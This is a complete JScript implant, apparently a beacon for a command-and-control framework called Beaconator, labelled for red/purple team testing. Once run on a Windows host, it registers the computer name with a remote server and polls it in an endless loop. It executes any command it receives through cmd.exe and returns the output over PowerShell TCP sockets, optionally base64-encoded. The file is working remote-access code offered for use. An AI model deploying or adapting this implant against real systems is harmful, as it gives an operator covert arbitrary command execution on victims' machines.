/*
This is a simple jscript beacon as part of the Beaconator C2 framework. 
Use only for legal and ethical red/purple team testing. 
See readme.md for Beaconator for instructions.  
Paste in your management server IP or pass in via parameters defined below.
 */


var serverIP = "127.0.0.1";
var serverPort = 5074;
var encoding = "plaintext";
var checkInInterval = 15; // seconds

var beaconID;
var computerName;
var logPath;


function generateBeaconID() {
    var guid = new ActiveXObject("Scriptlet.TypeLib").GUID;
    guid = guid.replace(/[\{\}-]/g, "");
    return guid.substr(0, 8).toLowerCase();
}

 
var b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

function utf8Encode(str) {
    return unescape(encodeURIComponent(str));
}

function utf8Decode(str) {
    return decodeURIComponent(escape(str));
}

function base64Encode(input) {
    var str = utf8Encode(input);
    var output = "";
    var i = 0;
    while (i < str.length) {
        var chr1 = str.charCodeAt(i++);
        var chr2 = str.charCodeAt(i++);
        var chr3 = str.charCodeAt(i++);
        var enc1 = chr1 >> 2;
        var enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
        var enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
        var enc4 = chr3 & 63;
        if (isNaN(chr2)) {
            enc3 = enc4 = 64;
        } else if (isNaN(chr3)) {
            enc4 = 64;
        }
        output += b64chars.charAt(enc1) + b64chars.charAt(enc2) +
                  b64chars.charAt(enc3) + b64chars.charAt(enc4);
    }
    return output;
}

function base64Decode(input) {
    var str = "";
    var i = 0;
    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (i < input.length) {
        var enc1 = b64chars.indexOf(input.charAt(i++));
        var enc2 = b64chars.indexOf(input.charAt(i++));
        var enc3 = b64chars.indexOf(input.charAt(i++));
        var enc4 = b64chars.indexOf(input.charAt(i++));
        var chr1 = (enc1 << 2) | (enc2 >> 4);
        var chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
        var chr3 = ((enc3 & 3) << 6) | enc4;
        str += String.fromCharCode(chr1);
        if (enc3 != 64) {
            str += String.fromCharCode(chr2);
        }
        if (enc4 != 64) {
            str += String.fromCharCode(chr3);
        }
    }
    return utf8Decode(str);
}

function encodeMessage(msg) {
    if (encoding.toLowerCase() === "base64") {
        return base64Encode(msg);
    }
    return msg;
}

function decodeMessage(msg) {
    if (encoding.toLowerCase() === "base64") {
        try {
            return base64Decode(msg);
        } catch (e) {
         
            return msg;
        }
    }
    return msg;
}

 
function logMessage(message) {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var logfile = fso.OpenTextFile(logPath, 8 /*ForAppending*/, true);
    var now = new Date();
    var timestamp = now.getFullYear() + "-" +
        pad(now.getMonth() + 1) + "-" + pad(now.getDate()) + " " +
        pad(now.getHours()) + ":" + pad(now.getMinutes()) + ":" + pad(now.getSeconds());
    logfile.WriteLine(timestamp + " " + message);
    logfile.Close();
 
    if (/cscript\.exe$/i.test(WScript.FullName)) {
        WScript.StdOut.WriteLine(message);
    }
}

function pad(num) {
    return (num < 10 ? "0" : "") + num;
}

 
function sendMessage(msg, expectResponse) {
    var encodedMsg = encodeMessage(msg);
    // escape single quotes for PowerShell
    encodedMsg = encodedMsg.replace(/'/g, "''");
    var psScript = "$ip='" + serverIP + "';" +
                   "$port=" + serverPort + ";" +
                   "$msg='" + encodedMsg + "';" +
                   "$bytes=[System.Text.Encoding]::UTF8.GetBytes($msg);" +
                   "$client=New-Object System.Net.Sockets.TcpClient;" +
                   "$client.Connect($ip,[int]$port);" +
                   "$stream=$client.GetStream();" +
                   "$stream.Write($bytes,0,$bytes.Length);" +
                   "$stream.Flush();";
    if (expectResponse) {
        psScript += "$buffer=New-Object byte[] 4096;" +
                    "$count=$stream.Read($buffer,0,$buffer.Length);" +
                    "$response=[System.Text.Encoding]::UTF8.GetString($buffer,0,$count);" +
                    "$client.Close();" +
                    "Write-Output $response";
    } else {
        psScript += "$client.Close();";
    }
    var command = "powershell.exe -NoProfile -NonInteractive -Command \"" + psScript + "\"";
    var shell = new ActiveXObject("WScript.Shell");
    var execObj = shell.Exec(command);
    var output = "";
    if (expectResponse) {
        // read all lines from StdOut
        while (!execObj.StdOut.AtEndOfStream) {
            output += execObj.StdOut.ReadLine() + "\n";
        }
        output = rtrim(output);
        // decode and return response
        return decodeMessage(output);
    }
    // drain error output and log any messages
    if (!execObj.StdErr.AtEndOfStream) {
        var errLines = "";
        while (!execObj.StdErr.AtEndOfStream) {
            errLines += execObj.StdErr.ReadLine() + "\n";
        }
        if (errLines.length > 0) {
            logMessage("PowerShell error: " + errLines);
        }
    }
    return "";
}

function rtrim(str) {
    return str.replace(/\s+$/, "");
}

 
function executeCommand(cmd) {
    var shell = new ActiveXObject("WScript.Shell");
    var execObj = shell.Exec("cmd.exe /c " + cmd);
    var outText = "";
    var errText = "";
    // read both streams until finished
    while (true) {
        if (!execObj.StdOut.AtEndOfStream) {
            outText += execObj.StdOut.ReadAll();
        }
        if (!execObj.StdErr.AtEndOfStream) {
            errText += execObj.StdErr.ReadAll();
        }
        if (execObj.Status === 1 && execObj.StdOut.AtEndOfStream && execObj.StdErr.AtEndOfStream) {
            break;
        }
        WScript.Sleep(100);
    }
    var result = "";
    if (outText.length > 0) {
        result += "STDOUT:\r\n" + outText + "\r\n";
    }
    if (errText.length > 0) {
        result += "STDERR:\r\n" + errText + "\r\n";
    }
    if (result.length === 0) {
        result = "Command executed (exit code: " + execObj.ExitCode + ")";
    }
    execObj.Terminate();
    return result;
}

 
function registerBeacon() {
    var msg = "register|" + beaconID + "|" + computerName;
    logMessage("Registering with message: " + msg);
    if (encoding.toLowerCase() === "base64") {
        logMessage("Encoded message: " + encodeMessage(msg));
    }
    var resp = sendMessage(msg, true);
    if (resp !== "") {
        logMessage("Registration response: " + resp);
    }
}

 
function requestAction() {
    var msg = "request_action|" + beaconID;
    logMessage("Requesting action...");
    return sendMessage(msg, true);
}

 
function sendCommandOutput(output) {
    var msg = "command_output|" + beaconID + "|" + output;
    logMessage("Sending command output (" + output.length + " characters)...");
    sendMessage(msg, false);
}

 
function processCommand(commandData) {
    if (!commandData || commandData.length === 0) return;
    if (/^no_pending_commands$/i.test(commandData)) return;
    logMessage("Processing command: " + commandData);
    var cmd;
    var prefix = "execute_command|";
    if (commandData.toLowerCase().indexOf(prefix) === 0) {
        cmd = commandData.substr(prefix.length);
    } else if (commandData.indexOf("|") === -1) {
        cmd = commandData;
    } else {
        logMessage("Unknown command format: " + commandData);
        return;
    }
    var result = executeCommand(cmd);
    sendCommandOutput(result);
}

 
function parseArguments() {
    var args = WScript.Arguments;
    var count = args.length;
    if (count >= 1) serverIP = args.Item(0);
    if (count >= 2) serverPort = parseInt(args.Item(1));
    if (count >= 3) encoding = args.Item(2).toLowerCase();
    if (count >= 4) checkInInterval = parseInt(args.Item(3));
}

 
function main() {
    parseArguments();
    beaconID = generateBeaconID();
    computerName = new ActiveXObject("WScript.Network").ComputerName;
    // determine log file path based on script location
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var scriptPath = WScript.ScriptFullName;
    var scriptFolder = fso.GetParentFolderName(scriptPath);
    logPath = scriptFolder + "\\beacon.log";
    logMessage("Beacon ID: " + beaconID);
    logMessage("Computer: " + computerName);
    logMessage("Server: " + serverIP + ":" + serverPort);
    logMessage("Encoding: " + encoding.toUpperCase());
    logMessage("Check-in interval: " + checkInInterval + " seconds");
    
    registerBeacon();
    while (true) {
        try {
            var action = requestAction();
            if (action && action.length > 0) {
                processCommand(action);
            }
        } catch (ex) {
            logMessage("Error requesting or processing action: " + ex.message);
        }
        logMessage("Sleeping for " + checkInInterval + " seconds...");
        WScript.Sleep(checkInInterval * 1000);
    }
}

 
main();
